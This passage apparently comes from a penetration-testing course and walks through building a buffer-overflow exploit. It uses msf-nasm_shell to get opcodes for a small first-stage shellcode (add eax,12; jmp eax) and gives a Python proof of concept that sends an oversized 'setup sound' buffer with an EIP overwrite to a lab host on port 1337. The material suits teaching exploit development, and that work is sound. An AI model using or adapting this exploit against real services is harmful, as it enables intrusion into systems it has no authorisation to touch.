![](bbox=[0.15, 0.08, 0.85, 0.36])

Figure 229. Number of bytes required for EAX adjustment

In order to get the correct opcodes for our instructions, we use the `msf-nasm_shell` utility from Metasploit.

```
kali@kali:~$ msf-nasm_shell

nasm > add eax,12
00000000 83C00C              add eax,byte +0xc

nasm > jmp eax
00000000  FFE0                jmp eax
```

Listing 372 - Obtaining first stage shellcode opcodes

Fortunately for us, these two sets of instructions (\x83\xc0\x0c\xff\xe0) take up only 5 bytes of memory. We can update the proof-of-concept by including the first stage shellcode and re-padding the original buffer with NOPs (\x90) in order to maintain the correct length.

```
#!/usr/bin/python
import socket

host = "10.11.0.128"

padding = "\x41" * 4368
eip = "\x42\x42\x42\x42"
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host, 1337))
print s.recv(1024)

s.send(buffer)
s.close()
```